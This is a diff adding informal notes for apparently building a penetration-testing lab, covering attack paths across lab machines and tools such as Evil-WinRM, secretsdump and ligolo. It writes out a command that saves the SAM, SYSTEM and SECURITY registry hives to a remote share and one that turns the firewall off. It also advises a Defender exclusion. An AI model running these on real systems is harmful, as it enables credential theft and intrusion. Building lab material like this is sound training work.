@@ -1,0 +1,77 @@
+Internal Notes:
+
+KALI - Confirm memory is 4 GB
+
+ADMIN03: When we get Helen's password can we automatically connect to ADMIN02 or ADMIN01 given that Helen is a local admin on them?
+
+MAIL01 - You may need to restart to get the reverse shell 
+
+DMZ01 - You may need to log in first before you can Evil-WinRM connect
+
+
+----------------------------------------------------------------------
+Pentest Report Modifications
+
+DEV01: Can we enable Apache and MySQL when we have a reverse shell as Daniela? (add to pentest report)
+How can we separate Daniela and Ernesto into 2 different computers, so there's no setup after booting the VMs.
+
+
+-------------------------
+Afterward: 
+DC01 - Run to make sure the 2 prompts at the beginning work
+
+pentest-report.txt quarantined by Windows Defender
+Ensure you set a defender exclusion before you unzip the project on your PC
+
+
+-----------------------------------------------------------------------------------
+
+For ligolo server, type "ifconfig" before "start"
+
+At first, only gain access to a non-domain joined user. Then you can credential harvest to get domain user credentials.
+
+ADMIN04 - Could we use impacket-secretsdump remotely, instead of reg.exe save hklm\sam sam.save hklm\system system.save hklm\security security.save \\10.10.14.10\
+
+
+Could you use evil-winrm instead of impacket-wmiexec, on FILES01?
+
+
+
+Change the ADMIN04 process so you use impacket-secretsdump to remotely dump the DCC2 hashes from ADMIN04.
+
+
+Use hostnames instead of the IP
+
+
+
+netsh advfirewall set allprofiles state off
+(Did we use this?)
+
+
+Can we use ligolo instead of chisel?
+
+
+If you only have a local account, but you know domain creds, you can use "runas" and enumerate domain users.
+
+
+How is it that we weren't able to RDP as Bernie even though he is a local admin?
+
+
+oneruletorulethemall
+
+
+If you upload a 1997-2003 word .doc file, but the victim has a newer version of word, will this work?
+
+IDOR attacks on a web app?!?!
+
+"Auto-logon" for Daneila on DEV01?
+
+Deleted Files in Recycle Bin
+
+
+
+Do any ports need to be open for sharphound capture to work?
+
+
+LAPS password
+
